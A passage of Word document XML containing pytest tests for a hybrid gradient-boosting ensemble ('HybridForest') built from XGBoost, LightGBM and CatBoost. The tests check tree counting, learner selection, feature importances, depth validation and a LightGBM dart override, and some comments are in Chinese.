        <w:t xml:space="preserve">    model, X, _ = small_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57BB4642">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pred = model.predict(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4FEECB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(pred).issubset(set(model.classes_))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6DF564">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A5269D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="685A2BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_all_three_boosters_actually_used(small_forest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6340896E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model, _, _ = small_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C4755D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(model.learner_kinds_) &lt;= {"xgboost", "lightgbm", "catboost"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521760DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(model.estimator_counts_) == {"xgboost", "lightgbm", "catboost"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A1224D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44A2F658">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42A8E057">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_tree_count_counts_trees_not_rounds(small_forest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49768502">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model, _, _ = small_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B4AED6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    k = len(model.classes_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0544BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    expected = sum(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6943E529">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        10 if kind == "catboost" else 10 * k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EF9843">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for kind in model.learner_kinds_</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5341C402">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131C4F21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert count_trees(model) == expected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A72419">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 报"轮数"会把 XGB/LGBM 那两路低估 6 倍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3A654F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert count_trees(model) &gt; 6 * 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C7C625">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50C2FB72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="130A0CDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_catboost_multiclass_builds_one_tree_per_round():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D499FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """CatBoost MultiClass 是多维叶子，轮数即树数；XGB/LGBM 则是每轮每类一棵。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180FB813">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    这条口径差异直接决定成本表，必须钉住。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237F6D49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y = make_data(n=1200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AC564B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619DF853">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=2, base_rounds=10, base_depth=3, base_pool=("catboost",), random_state=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1DDA54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E33115E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert count_trees(model) == 2 * 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EA6F5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FB62B39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713D4A5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=2, base_rounds=10, base_depth=3, base_pool=("lightgbm",), random_state=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB74085">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63034C22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert count_trees(model) == 2 * 10 * len(model.classes_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660F2A26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36BF7781">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C6F2EDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_feature_importance_has_full_width(small_forest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A84C4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model, X, _ = small_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D5E9FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    imp = model.feature_importances_</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A924547">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert imp.shape == (X.shape[1],)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B222AA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert (imp &gt;= 0).all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FE7C76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06308BB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F9D0BEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_deep_base_learner_is_rejected():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727809EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y = make_data(n=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9E76B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with pytest.raises(ValueError, match="base_depth"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBF6401">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        HybridForest(max_depth=6, base_depth=24, n_estimators=1, base_rounds=2).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3852BD2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DF93382">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="793CC7CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_dart_override_reaches_lightgbm():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB3FD01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y = make_data(n=600)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21117262">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C12546B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_estimators=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2661FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_rounds=10,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE44F3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_depth=3,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB23469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_pool=("lightgbm",),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483852B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        base_overrides={"lightgbm": {"boosting_type": "dart", "drop_rate": 0.1}},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B49462F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        random_state=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25847D14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0099E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert model.estimators_[0].boosting_type == "dart"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED64D1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28866335">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E8D6F89">
      <w:pPr>
